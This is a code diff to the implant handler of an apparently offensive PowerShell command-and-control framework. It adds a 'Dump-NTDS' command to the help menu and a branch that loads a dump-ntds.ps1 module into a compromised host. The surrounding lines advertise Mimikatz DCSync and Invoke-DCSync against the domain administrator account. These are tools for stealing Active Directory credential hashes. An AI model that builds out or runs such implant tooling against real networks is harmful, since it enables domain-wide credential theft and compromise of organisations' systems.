@@ -211,6 +211,7 @@ function Implant-Handler
         write-host "============================================" -ForegroundColor Red
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
+        write-host " Dump-NTDS -EmptyFolder <emptyfolderpath>" -ForegroundColor Green
         write-host `n "Useful Modules: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
@@ -925,6 +926,10 @@ param
             if ($pscommand.tolower().startswith('invoke-wmicommand'))
             {
                 CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
+            }
+            if ($pscommand.tolower().startswith('dump-ntds'))
+            {
+                CheckModuleLoaded "dump-ntds.ps1" $psrandomuri
             }
             if ($pscommand.tolower().startswith('brute-ad'))
             {
